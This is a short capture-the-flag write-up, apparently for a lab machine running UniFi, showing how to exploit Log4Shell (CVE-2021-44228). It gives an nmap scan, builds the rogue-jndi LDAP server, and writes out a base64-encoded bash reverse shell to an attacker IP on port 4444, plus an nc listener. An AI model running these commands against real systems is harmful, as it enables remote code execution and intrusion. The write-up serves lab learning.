#Linux #CVE-2021-44228


**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.129.18.96
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)

OPEN PORTS

* 22/tcp   open  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
* 6789/tcp open  ibm-db2-admin?
* 8080/tcp open  http-proxy
* 8443/tcp open  ssl/nagios-nsca Nagios NSCA
* 8843/tcp open  ssl/unknown
* 8880/tcp open  cddbp-alt?

We'll follow procedure described in the following article:

https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

Our action plan is to get a reverse shell so we can interact with the underlying Linux operating system

```sh
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
 ```
 
 ![image](https://user-images.githubusercontent.com/99097743/170054746-daa8621e-f227-45a2-bd18-b3a3078ac94c.png)
 
  It seems that Maven (MVN) is not installed in our localhost. 
  
```sh
sudo apt-get install maven 

```
  
Reverse shell command: 

```sh
echo 'bash -c bash -i >&/dev/tcp/10.10.16.26/4444 0>&1' | base64
#This command will generate a base64 encrypted string

#To start the rogue-jndi LDAP server up
java -jar target/RogueJndi-1.1.jar --command "bash -c {YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjYvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.26"
# Make sure to change the directory, base64 hash, and IP address --> VPN IP

#Start listening on a new terminal
sudo nc -nvlp 4444

```
